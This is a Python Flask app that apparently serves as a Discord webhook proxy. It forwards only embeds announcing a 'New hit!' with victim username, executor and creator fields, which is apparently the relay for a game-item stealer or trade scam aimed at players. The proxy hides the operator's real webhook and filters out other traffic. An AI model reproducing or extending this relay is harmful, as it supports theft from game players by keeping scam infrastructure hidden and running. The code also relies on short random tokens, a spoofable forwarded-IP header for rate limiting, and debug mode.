from flask import Flask, request, jsonify, redirect
import os, string, random, requests
from time import time

app = Flask(__name__)

# TEMP: In-memory storage of tokens → real webhook
webhook_map = {}
ip_registry = {}  # Rate limiting per token+IP
LIMIT_SECONDS = 3600

def generate_token(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@app.route("/", methods=["GET"])
def home():
    return """
    <h1>Webhook Proxy Setup</h1>
    <form action="/create" method="post">
        <label>Enter Your Real Discord Webhook URL:</label><br>
        <input type="text" name="real_webhook" style="width:300px" required><br><br>
        <input type="submit" value="Generate Proxy Webhook">
    </form>
    """

@app.route("/create", methods=["POST"])
def create_webhook():
    real_webhook = request.form.get("real_webhook")
    if not real_webhook or "discord.com/api/webhooks/" not in real_webhook:
        return "Invalid Discord Webhook URL", 400

    token = generate_token()
    webhook_map[token] = real_webhook
    return f"Your proxy webhook: <code>{request.host_url}webhook/{token}</code>"

@app.route("/webhook/<token>", methods=["POST"])
def handle_webhook(token):
    if token not in webhook_map:
        return jsonify({"error": "Invalid token"}), 404

    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    key = f"{token}:{client_ip}"

    if key in ip_registry and time() - ip_registry[key] < LIMIT_SECONDS:
        return jsonify({"error": "Rate limited"}), 429

    data = request.json
    if not data or "embeds" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    # Simple embed validation
    allowed = False
    for embed in data["embeds"]:
        if embed.get("title", "").strip() == "New hit!\nWhen ingame say anything in the chat to recive the stuff":
            for field in embed.get("fields", []):
                if field.get("name") == "Player Info":
                    value = field.get("value", "")
                    if all(x in value for x in ["Username:", "Executor:", "Creator:"]):
                        allowed = True
                        break

    if not allowed:
        return jsonify({"error": "Blocked: Invalid embed content"}), 400

    # Forward to real webhook
    ip_registry[key] = time()
    real_url = webhook_map[token]
    response = requests.post(real_url, json=data)

    return jsonify({"status": "sent", "discord_status": response.status_code})

if __name__ == "__main__":
    app.run(debug=True)
